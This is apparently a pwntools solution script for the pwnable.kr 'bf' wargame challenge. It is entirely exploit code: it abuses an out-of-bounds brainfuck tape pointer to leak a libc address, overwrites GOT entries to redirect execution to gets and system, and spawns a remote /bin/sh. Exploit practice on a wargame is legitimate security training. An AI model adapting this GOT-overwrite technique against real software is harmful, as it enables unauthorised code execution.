from pwn import *

p = remote("pwnable.kr", 9001)
context(log_level="debug", arch="i386", os="linux")

elf = ELF("./bf")
libc = ELF("./bf_libc.so")
tape_addr = elf.symbols["tape"]
main_addr = elf.symbols["main"]
putchar_got = elf.got["putchar"]
memset_got = elf.got["memset"]
fgets_got = elf.got["fgets"]
libc_putchar = libc.symbols["putchar"]
libc_system = libc.symbols["system"]
libc_gets = libc.symbols["gets"]

payload = b"." + b"<" * (tape_addr - putchar_got) + b".>" * 4
payload += b"<" * 4 + b",>" * 4
payload += b"<" * (putchar_got - memset_got + 4) + b",>" * 4
payload += b"<" * (memset_got - fgets_got + 4) + b",>" * 4
payload += b"."

p.recvline_startswith("type")
p.sendline(payload)

p.recv(1)
libc_base = u32(p.recv()) - libc_putchar
p.send(p32(main_addr))
p.send(p32(libc_gets + libc_base))
p.send(p32(libc_system + libc_base))
p.sendline(b"/bin/sh\x00")

p.interactive()
